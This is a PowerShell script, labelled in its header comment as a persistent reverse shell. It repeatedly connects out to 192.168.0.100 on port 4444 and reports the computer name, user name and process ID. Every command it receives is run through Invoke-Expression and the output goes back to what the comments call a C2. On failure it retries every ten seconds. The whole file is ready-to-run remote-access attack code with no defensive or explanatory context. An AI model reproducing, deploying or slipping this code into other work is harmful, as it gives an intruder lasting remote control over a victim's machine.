# Persistent reverse shell - auto-reconnects forever
$ip = "192.168.0.100"
$port = 4444
$sleepSeconds = 10

while ($true) {
    try {
        $client = New-Object System.Net.Sockets.TCPClient($ip, $port)
        $stream = $client.GetStream()
        $writer = New-Object System.IO.StreamWriter($stream)
        $reader = New-Object System.IO.StreamReader($stream)
        $writer.AutoFlush = $true

        # Send banner
        $writer.WriteLine("[+] $env:COMPUTERNAME\$env:USERNAME | PID: $PID")

        # Command loop - no prompts, just read/execute/respond
        while ($client.Connected) {
            $cmd = $reader.ReadLine()
            if (-not $cmd) { break }
            if ($cmd -eq "exit") {
                $client.Close()
                break
            }

            try {
                $output = Invoke-Expression $cmd 2>&1 | Out-String -Width 4096
                $writer.WriteLine($output.TrimEnd())
                $writer.WriteLine("<<END>>")  # end marker for C2 to detect
            } catch {
                $writer.WriteLine("ERROR: $_")
                $writer.WriteLine("<<END>>")
            }
        }
        $client.Close()
    } catch {}

    Start-Sleep -Seconds $sleepSeconds
}
